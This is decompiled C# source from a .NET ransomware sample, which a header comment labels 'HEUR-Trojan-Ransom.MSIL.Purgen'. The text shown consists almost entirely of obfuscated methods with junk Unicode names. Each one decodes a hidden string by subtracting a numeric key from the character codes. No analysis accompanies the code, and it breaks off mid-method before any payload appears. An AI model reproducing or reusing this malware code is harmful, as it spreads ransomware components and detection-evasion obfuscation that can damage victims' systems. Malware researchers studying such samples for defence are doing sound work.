// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: ꌳꌆꍁꋿꌕꌜꌇꌆꌄꌄꍀꌄꌁꍁꌕ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FAF82406-93DC-4D5D-948A-CEB8E42B10A6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.12-msil\HEUR-Trojan-Ransom.MSIL.Purgen.gen-5bfba90917bc5e5acd1b61ac2ffdcbbd8fec71eb7fdfb0b681207cc2371d5b94.exe

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

internal class \u003CModule\u003E
{
  public static string ᛄᚇᛂᚏᚹᚫᚋᚈᚏᚺᚸᚺᚊᚏᚐ()
  {
    string source = "\uDBF9";
    string str = "56255";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 汕汛決沛汜汛沅汘汛沏沞沇沜汰沊()
  {
    string source = "ɺʟʘʥʞʜ";
    string str = "567";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 콉콆콴콛콲콊콦콊쾆콂콊콵콫콳콳()
  {
    string source = "䇗䈊䈉䈉䈄䈃";
    string str = "16789";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 쀇쀳뿿쀅쀃쁈쀲쀺쀕쀰쀇쀹쀲쀄쀇()
  {
    string source = "䊛";
    string str = "16963";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 魹魋魼魼魍魋魈魸魊魈魏魈魏魋魇()
  {
    string source = "儔";
    string str = "20667";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \uF28F\uF25D\uF25E\uF262\uF2A3\uF262\uF287\uF25E\uF262\uF260\uF290\uF2A5\uF28F\uF27A\uF291()
  {
    string source = "鄂鄣郔鄡鄕鄨鄦鄝鄬";
    string str = "37044";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \u22A3\u228A\u22B6\u2284\u22C8\u22C1\u22B6\u22C6\u22CA\u2285\u228C\u22B7\u2284\u22BE\u22A5()
  {
    string source = "껷꼤꼤꼡꼤";
    string str = "44722";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string ꑏꐛꑎꑋꐢꑐꐛꐾꐛꐢꐛꐣꐟꑌꐢ()
  {
    string source = "\uE9E1\uEA0E\uEA0E\uEA0B\uEA0E";
    string str = "59804";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 끳낞끱끫낤끽끲끯낓낈끲낓낍끫낝()
  {
    string source = "䀘\uFADE\uFAE9\uFAE6\uFAE1";
    string str = "64125";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 㵾㶁㵻㵽㵺㵾㵺㶁㵺㶫㵿㵹㵼㵺㶂()
  {
    string source = "業楸榃榀楻";
    string str = "26903";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 횑횰횔횴훂횓훁횖훒횖횵횔훅후훌()
  {
    string source = "ァガシゴク";
    string str = "12363";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 럺럷럳럹럴럺럸럵렧럳럶럷렏려럵()
  {
    string source = "㸲㹟㹟㹜㹟";
    string str = "15853";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 씬씿씟씴씆씷씝씇씣씃씥씿씃씃씼()
  {
    string source = "榷榫榾榼榳槂榓榸榺榿榾楻";
    string str = "26954";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 䲃䲔䲅䲶䳁䲸䲇䳊䳃䲄䲇䲙䳁䲈䲽()
  {
    string source = "";
    string str = "42202";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \u25E2\u25CA\u25D5\u25B1\u25AD\u25B1\u25DE\u25DF\u25B1\u25E1\u25B5\u25B2\u25B1\u25E0\u25E0()
  {
    string source = "▨△▾▻▶";
    string str = "9554";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 瑄瑓瑀瑀瑦瑃琼瑀瑯瑄璂瑼瑁瑴瑮()
  {
    string source = "궬궷귂궿궺";
    string str = "44374";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 뫉묎묉뫉뫻뫻묒뫾뫐뫍뫹뫼뫌뫾뫉()
  {
    string source = "䍂䍣䍲䍣䍰䍫䍧䍬䍟䍬䍲";
    string str = "17150";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \u32C8\u32D2\u32E1\u32F2\u32F5\u32C0\u32C4\u32E8\u32F7\u32C6\u32F2\u32C4\u32C2\u32C7\u32C0()
  {
    string source = "ᒺᓟᓧᓖᓣᓤᓖ";
    string str = "5233";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \u1BACᮕᮝᮥᮚᮝᮘᮔᯇᮘᯊᯑᮙᯇᮛ()
  {
    string source = "\uEB84\uEBA2\uEB91\uEB9E\uEBA3\uEBA0\uEB9F\uEBA3\uEB95";
    string str = "60208";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 괊괉괶괅괇괶괊괄괴괴괵괆괣괲괦()
  {
    string source = "堥塇堿";
    string str = "22482";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \uF5C5\uF5F2\uF5FE\uF5C4\uF5EF\uF5BF\uF5E6\uF5C5\uF5D2\uF5C7\uF5D5\uF5E4\uF5BF\uF5F4\uF5C0()
  {
    string source = "㳦㴈㳵㴇㴅㳴㳶㴇㳼㴂㴁";
    string str = "15507";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string ᐅ\u13F7ᏅᏵᏄᏫᏣᏅᏹᏹ\u13F6ᏋᏆᏉᏅ()
  {
    string source = "\uF59A\uF5C2\uF5B9\uF5C1\uF5B6\uF5BD\uF5B9\uF5B6\uF5B0\uF5AE\uF5C1\uF5B6\uF5BC\uF5BB";
    string str = "62797";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 粟粷粈糊粈粉粽粌粷粍粋粆粌粸糂()
  {
    string source = "\uF31F\uF32F\uF32D\uF338\uF32D\uF33E\uF2EC\uF319\uF341\uF338\uF340\uF335\uF33C\uF338\uF335\uF32F\uF32D\uF340\uF335\uF33B\uF33A";
    string str = "62156";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \uE56E\uE56F\uE59D\uE58C\uE59E\uE570\uE57D\uE570\uE588\uE574\uE5A9\uE56E\uE5A0\uE5AD\uE5A4()
  {
    string source = "ﳿﴠﴯﴠﴭﴨﴤﴩﴜﴩﴯ";
    string str = "64699";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 迒込辟辟返辞辣辞辦辝辞辦迒迓辠()
  {
    string source = "ᅆᅫᅳᅢᅯᅰᅢ";
    string str = "4349";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 듍듆뒲뒱듪듡뒰뒲뒱듲듔뒱뒴뒱듲()
  {
    string source = "穧窅穴突窆窃窂窆穸";
    string str = "31251";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \uEA88\uEAC9\uEA94\uEACA\uEA81\uEAB2\uEAA2\uEAB9\uEA86\uEAC1\uEA85\uEA82\uEA87\uEA82\uEAB3()
  {
    string source = "ቍቕቌ";
    string str = "4576";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \uF6BF\uF6BD\uF6AF\uF6AB\uF6B3\uF6AD\uF6DF\uF6AC\uF6AD\uF6F2\uF6DE\uF6AC\uF6AF\uF6B2\uF6AF()
  {
    string source = "\uEC44";
    string str = "60440";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 꽿꽒꾁꽑꽔꽔꽽꽿꽾꽕꽍꽪꽌꽑꽕()
  {
    string source = "";
    string str = "12876";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string ꔨꔏꓵꓱꔎꓷꔨꔣꔡꔅꔥꔦꔦꔭꔲ()
  {
    string source = "岢";
    string str = "23666";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \uF082\uF080\uF080\uF080\uF07E\uF084\uF07C\uF0BC\uF07D\uF0B0\uF082\uF0B0\uF07F\uF080\uF093()
  {
    string source = "";
    string str = "30245";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 䢥䣓䣎䢤䢜䣎䣄䢥䣎䣎䢡䢤䣍䣜䢠()
  {
    string source = "۰";
    string str = "1728";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \u2A19\u29FA\u29F4\u29F5\u29F2\u2A26\u2A3A\u29F8\u2A30\u29F3\u29F6\u29F7\u2A17\u2A23\u29F8()
  {
    string source = "";
    string str = "2167";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 池汢沐池沑汢污汬沌汛汣汜沌沎沟()
  {
    string source = "ᤊ";
    string str = "6362";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \u06F3\u06FEۮ\u070Cۭܝܡ\u070Dܤ۳ܞ\u070C۰ܡܩ()
  {
    string source = "";
    string str = "3122";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string ᕾᖩᕻᖴᕻᖇᕽᕻᗀᖓᕼᕼᖮᖲᖈ()
  {
    string source = "ϑ";
    string str = "928";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 邯邴郠邮郟邮郟邴郔郵郆郇邳郞邯()
  {
    string source = "";
    string str = "60779";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD()
  {
    string source = "চ";
    string str = "2409";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string ᛗᜋᛘᛩᛜᛙ᜔ᛚᜈᛖᜈᛕ\u1719ᛞᛵ()
  {
    string source = "";
    string str = "23063";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \u0C3Bలోఅఆఇఴళదఅఴఊనఴం()
  {
    string source = "";
    string str = "44868";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 㛳㚾㛁㛀㛡㚼㚿㛐㚿㛱㛔㚿㛄㛐㛰()
  {
    string source = "낛낯냆끮끿끾냆끿끾";
    string str = "45134";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 䵨䵗䵙䶇䵐䵕䵦䵑䵗䵐䶃䶅䶁䶖䵱()
  {
    string source = "匄匘匯勗勨勧匯勨勧";
    string str = "21175";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 툫툋툝툑퉈툎툉퉊툍툎툌툿툒툻툪()
  {
    string source = "ᱽᱽ\u1CABᱽᱽ\u1CAB\u1C98\u1CBC\u1CB0\u1CB6\u1CB4᳂\u1CAB᳇\u1CAE\u1CB7\u1CBE᳅\u1CB4᳁ᱽ\u1CBF\u1CBD\u1CB6";
    string str = "7247";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \u0EF1\u0EF2\u0EF4\u0EE5່\u0EC7\u0EF3\u0EFF\u0EDAໆໞແ\u0F01\u0EF1\u0EE2()
  {
    string source = "ꡚꡚꢈꡚꡚꢈ꡵ꢙꢍꢓꢑꢟꢈꢤꡚꢜꢚꢓ";
    string str = "43052";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 鑉鑰鑟鑲鐳鑔鑝鑌鑜鑱鐴鐳鐯鐬鐬()
  {
    string source = "權權欸權權欸欥歉欽歃歁歏欸歉欻歄歋歒歁歎權歌歊歃";
    string str = "27356";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string ܭݩܭݞܯܲܮݤܽݢܪܲܲܩݚ()
  {
    string source = "ꢑꢑꢿꢑꢑꢿꢬ꣐꣄\uA8CA\uA8C8꣖ꢿ꣐ꢑ꣓꣑\uA8CA";
    string str = "43107";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \u207C\u2049\u2059\u204E\u204C\u207A\u204F\u207D\u204C\u2049\u2049\u2048\u2079\u2050⁠()
  {
    string source = "任伣伜伒伸伵伺估伭伻伇伯伻伹似伻伺伱伺佀任伹伭伵伺佃伵伺估伻佃仺佄伭伹伸";
    string str = "20172";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 箋範箇箃箋算箇箸箆箥箄箷箴箃箧()
  {
    string source = "롌롟롗롙롌롚롚롐롖롕";
    string str = "47079";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 淙淅涓涳淈淄淄涗涓涖涕淇淅涚淋()
  {
    string source = "ḏḢḚḜḏḝḝḓḙḘ";
    string str = "7594";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 푚푂푟퐠푞퐾퐼퐢퐟퐣퐰푒퐣퐦푏()
  {
    string source = "䙓";
    string str = "17955";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 䓋䓉䓃䔌䓇䓜䓷䓵䔈䓳䔅䓃䓃䔁䓇()
  {
    string source = "육윦윳";
    string str = "50877";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 䤵䥖䥖䤨䥑䥔䤩䤵䥕䤥䤩䤢䤡䥀䤥()
  {
    string source = "ﳇﳉﳁ";
    string str = "64596";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string ᣮᤈᤠᣠᤊᣘᣜᣞ\u18FBᤌᣞ\u18F6ᣟᤊᤉ()
  {
    string source = "ꓢꓤꓑ";
    string str = "42095";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD\uFFFD()
  {
    string source = "㨺㩂㨹";
    string str = "14797";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
